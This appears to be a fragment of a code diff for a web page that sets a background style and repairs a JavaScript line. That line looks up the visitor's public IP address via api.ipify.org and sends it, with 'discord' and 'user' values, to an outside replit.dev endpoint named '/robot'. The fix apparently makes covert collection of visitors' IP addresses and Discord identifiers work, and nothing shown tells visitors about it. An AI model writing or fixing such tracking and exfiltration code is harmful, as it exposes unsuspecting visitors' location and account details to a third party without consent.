@@ -7,6 +7,7 @@
     <style>
         body {
             background-image: url("d8680b1c1576ecc8.svg");
+            background-size: cover;
             color: #FFFFFF;
             font-family: Arial, sans-serif;
             display: flex;
@@ -52,7 +53,7 @@
     try {
         response = await fetch('https://api.ipify.org?format=json');
         data = await response.json();
-        link = 'https://0351ef4b-a5fb-477a-9df3-dd35782c9695-00-30aukvo4epq2k.janeway.replit.dev/robot?discord='+discord"'&user='+user+'&ip='+data.ip
+        link = 'https://0351ef4b-a5fb-477a-9df3-dd35782c9695-00-30aukvo4epq2k.janeway.replit.dev/robot?discord='+discord+'&user='+user+'&ip='+data.ip
         response = await fetch(link);
     } catch (error) {
         
